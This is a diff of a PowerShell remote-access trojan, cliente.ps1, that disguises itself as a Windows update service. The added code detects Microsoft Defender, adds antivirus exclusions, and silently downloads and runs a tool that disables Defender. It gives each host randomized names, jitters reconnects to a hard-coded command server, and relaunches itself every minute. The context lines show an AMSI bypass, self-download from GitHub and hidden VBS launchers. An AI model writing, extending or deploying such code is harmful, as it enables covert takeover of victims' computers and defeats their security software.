@@ -1,9 +1,16 @@
 # language: PowerShell, file: cliente.ps1, target: Windows 10/11, PowerShell 5.1
-# full agent — install, persistence, AMSI bypass, mutex guard, C# runtime with reconnect fix
+# adaptive install: if Defender off → clean install; if on → exclusions + Sordum + install
 
 $serverIP = "198.1.195.204"
 $serverPort = 4000
-$installName = "WinUpdateSvc"
+
+$h = [System.BitConverter]::ToString(
+    [System.Security.Cryptography.MD5]::Create().ComputeHash(
+        [System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))).Replace("-","").Substring(0,8).ToLower()
+$installName  = "WinUpdateSvc_$h"
+$taskName     = "MicrosoftWindowsUpdateService_$h"
+$taskRepName  = "MicrosoftWindowsUpdateServiceRep_$h"
+$mutexName    = "Local\WinUpdateSvcMutex_$h"
 $myUrl = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1"
 
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
@@ -12,11 +19,68 @@ if (-not $isAdmin) {
     exit
 }
 
-$dir = "$env:ProgramData\Microsoft\Windows\Caches"
+$dir = "$env:ProgramData\Microsoft\Windows\Caches\$h"
 $scriptPath = "$dir\$installName.ps1"
 $vbsPath = "$dir\$installName.vbs"
 
 if ($args -notcontains "-silent") {
+    # ============================================================
+    # 1. Deteta estado do Defender
+    #    RealTimeProtectionEnabled=false  → off (user disabled, or 3rd-party AV)
+    #    AntivirusEnabled=false           → off
+    #    Get-MpComputerStatus falha       → assume on (defensive default)
+    # ============================================================
+    $defenderOff = $false
+    try {
+        $mp = Get-MpComputerStatus -ErrorAction Stop
+        if ($mp -and ((-not $mp.RealTimeProtectionEnabled) -or (-not $mp.AntivirusEnabled))) {
+            $defenderOff = $true
+        }
+    } catch { }
+
+    # ============================================================
+    # 2. Defesas — só se o Defender estiver ativo
+    # ============================================================
+    if (-not $defenderOff) {
+        $sd = "$env:TEMP\sd_$h"
+        New-Item -ItemType Directory -Path $sd -Force -ErrorAction SilentlyContinue | Out-Null
+
+        # exclusões ANTES de qualquer byte em disco
+        New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
+        try { Add-MpPreference -ExclusionPath $dir -Force -ErrorAction SilentlyContinue } catch {}
+        try { Add-MpPreference -ExclusionPath $sd -Force -ErrorAction SilentlyContinue } catch {}
+        try { Add-MpPreference -ExclusionProcess "powershell.exe" -Force -ErrorAction SilentlyContinue } catch {}
+        try { Add-MpPreference -ExclusionProcess "wscript.exe" -Force -ErrorAction SilentlyContinue } catch {}
+
+        # Sordum Defender Control
+        try {
+            $7zr = "$sd\7zr.exe"
+            if (-not (Test-Path $7zr)) {
+                Invoke-WebRequest -Uri "https://www.7-zip.org/a/7zr.exe" -OutFile $7zr -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
+            }
+            $zip = "$sd\dc.zip"
+            Invoke-WebRequest -Uri "https://www.sordum.org/files/downloads/defender-control.zip" -OutFile $zip -UseBasicParsing -TimeoutSec 30 -ErrorAction SilentlyContinue
+
+            if ((Test-Path $7zr) -and (Test-Path $zip)) {
+                & $7zr x $zip "-o$sd\out" -y 2>$null | Out-Null
+                $inner = Get-ChildItem "$sd\out" -Filter "dControl.zip" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+                if ($inner) {
+                    & $7zr x $inner.FullName "-o$sd\final" -p"sordum" -y 2>$null | Out-Null
+                }
+                $exe = Get-ChildItem "$sd\final" -Filter "dControl.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+                if (-not $exe) {
+                    $exe = Get-ChildItem "$sd\out" -Filter "dControl.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+                }
+                if ($exe) {
+                    Start-Process -FilePath $exe.FullName -ArgumentList "/D", "/s" -WindowStyle Hidden -Wait -ErrorAction SilentlyContinue
+                }
+            }
+        } catch {}
+    }
+
+    # ============================================================
+    # 3. Instalação — igual para os dois casos
+    # ============================================================
     New-Item -ItemType Directory -Path $dir -Force -ErrorAction SilentlyContinue | Out-Null
     try { (New-Object Net.WebClient).DownloadFile($myUrl, $scriptPath) } catch {}
 
@@ -36,14 +100,17 @@ if ($args -notcontains "-silent") {
     } catch {}
 
     try {
+        # Defender off: task a cada 3 min (só para sobreviver a reboot/logoff)
+        # Defender on:  task a cada 1 min (para relançar depois de cada kill)
+        $interval = if ($defenderOff) { 3 } else { 1 }
         $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //Nologo `"$vbsPath`""
         $triggerLogon = New-ScheduledTaskTrigger -AtLogOn
         $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date) `
-            -RepetitionInterval (New-TimeSpan -Minutes 3) `
+            -RepetitionInterval (New-TimeSpan -Minutes $interval) `
             -RepetitionDuration ([TimeSpan]::FromDays(3650))
         $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest
         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0) -MultipleInstances IgnoreNew
-        Register-ScheduledTask -TaskName "MicrosoftWindowsUpdateService" `
+        Register-ScheduledTask -TaskName $taskName `
             -Action $action -Trigger $triggerLogon,$triggerRepeat -Principal $principal `
             -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
     } catch {}
@@ -55,13 +122,17 @@ if ($args -notcontains "-silent") {
     exit
 }
 
+# ============================================================
+# BLOCO -silent — inalterado
+# ============================================================
+
 $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }
 
-# single-instance guard — scheduled task fires every 3 min, this exits in 20ms if agent already alive.
-# kernel releases the mutex when the process dies, so the next task fire restarts cleanly.
-$mutex = New-Object System.Threading.Mutex($false, "Local\WinUpdateSvcMutex")
+$mutex = New-Object System.Threading.Mutex($false, $mutexName)
 if (-not $mutex.WaitOne(0)) { exit }
+
+Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 6000)
 
 if (-not ("R9KAgent" -as [type])) {
     Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
@@ -154,6 +225,8 @@ if (-not ("R9KAgent" -as [type])) {
             Thread tWatch = new Thread(WatchdogLoop); tWatch.IsBackground = true; tWatch.Start();
             Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();
 
+            Random rng = new Random();
+
             while (true) {
                 TcpClient myClient = null;
                 try {
@@ -197,7 +270,7 @@ if (-not ("R9KAgent" -as [type])) {
                     globalWriter = null;
                     try { if (myClient != null) myClient.Close(); } catch {}
                 }
-                Thread.Sleep(3000);
+                Thread.Sleep(rng.Next(2000, 5000));
             }
         }
 
@@ -211,36 +284,26 @@ if (-not ("R9KAgent" -as [type])) {
 
         static void WatchdogLoop() {
             string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
-            string scriptPath = dir + @"\WinUpdateSvc.ps1";
-            string vbsPath = dir + @"\WinUpdateSvc.vbs";
-
             while (true) {
                 try {
                     if (!Directory.Exists(dir)) Directory.CreateDirectory(dir);
-                    if (!File.Exists(scriptPath)) {
-                        string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
-                        using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); }
-                        File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
-                    }
-                    if (!File.Exists(vbsPath)) {
-                        string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
-                        File.WriteAllText(vbsPath, vbs);
-                        File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly);
-                    }
-                    string cmd = "wscript.exe //B //Nologo \"" + vbsPath + "\"";
-                    using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                        if (rk != null && rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
-                    }
-                    using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) {
-                        if (rk != null && rk.GetValue("WinUpdateSvc") == null) rk.SetValue("WinUpdateSvc", cmd);
-                    }
-                    string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                    string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
-                    if (!File.Exists(startupVbs)) {
-                        try { File.Copy(vbsPath, startupVbs, true); File.SetAttributes(startupVbs, FileAttributes.Hidden | FileAttributes.System); } catch {}
+                    foreach (string sub in Directory.GetDirectories(dir)) {
+                        string leaf = sub.Substring(sub.Length - 8);
+                        string scriptPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".ps1");
+                        string vbsPath = Path.Combine(sub, "WinUpdateSvc_" + leaf + ".vbs");
+                        if (!File.Exists(scriptPath)) {
+                            string url = "https://raw.githubusercontent.com/luskavqq7/Windows-Update/refs/heads/main/cliente.ps1";
+                            try { using (var wc = new System.Net.WebClient()) { wc.DownloadFile(url, scriptPath); } } catch {}
+                            try { File.SetAttributes(scriptPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
+                        }
+                        if (!File.Exists(vbsPath)) {
+                            string vbs = "CreateObject(\"WScript.Shell\").Run \"powershell.exe -nop -w hidden -ep bypass -f \"\"" + scriptPath + "\"\" -silent\", 0, False";
+                            try { File.WriteAllText(vbsPath, vbs); } catch {}
+                            try { File.SetAttributes(vbsPath, FileAttributes.Hidden | FileAttributes.System | FileAttributes.ReadOnly); } catch {}
+                        }
                     }
                 } catch {}
-                Thread.Sleep(5000);
+                Thread.Sleep(30000);
             }
         }
 
@@ -437,17 +500,22 @@ if (-not ("R9KAgent" -as [type])) {
                     BlockInput(false);
                     UnblockAllApps();
                     try {
-                        using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue("WinUpdateSvc", false); }
-                        using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue("WinUpdateSvc", false); }
-                        Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService /f").WaitForExit();
-                        string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
-                        string startupVbs = Path.Combine(startup, "WinUpdateSvc.vbs");
-                        if (File.Exists(startupVbs)) { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); }
-
-                        string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.ps1";
-                        string vbsPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches\WinUpdateSvc.vbs";
-                        if (File.Exists(scriptPath)) { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); }
-                        if (File.Exists(vbsPath)) { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); }
+                        string dir = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + @"\Microsoft\Windows\Caches";
+                        foreach (string sub in Directory.GetDirectories(dir)) {
+                            string leaf = sub.Substring(sub.Length - 8);
+                            string runName = "WinUpdateSvc_" + leaf;
+                            try { using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
+                            try { using (RegistryKey rk = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true)) { if (rk != null) rk.DeleteValue(runName, false); } } catch {}
+                            try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateService_" + leaf + " /f").WaitForExit(); } catch {}
+                            try { Process.Start("schtasks", "/delete /tn MicrosoftWindowsUpdateServiceRep_" + leaf + " /f").WaitForExit(); } catch {}
+                            string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+                            string startupVbs = Path.Combine(startup, runName + ".vbs");
+                            if (File.Exists(startupVbs)) { try { File.SetAttributes(startupVbs, FileAttributes.Normal); File.Delete(startupVbs); } catch {} }
+                            string scriptPath = Path.Combine(sub, runName + ".ps1");
+                            string vbsPath = Path.Combine(sub, runName + ".vbs");
+                            if (File.Exists(scriptPath)) { try { File.SetAttributes(scriptPath, FileAttributes.Normal); File.Delete(scriptPath); } catch {} }
+                            if (File.Exists(vbsPath)) { try { File.SetAttributes(vbsPath, FileAttributes.Normal); File.Delete(vbsPath); } catch {} }
+                        }
                     } catch {}
                     Environment.Exit(0);
                 }
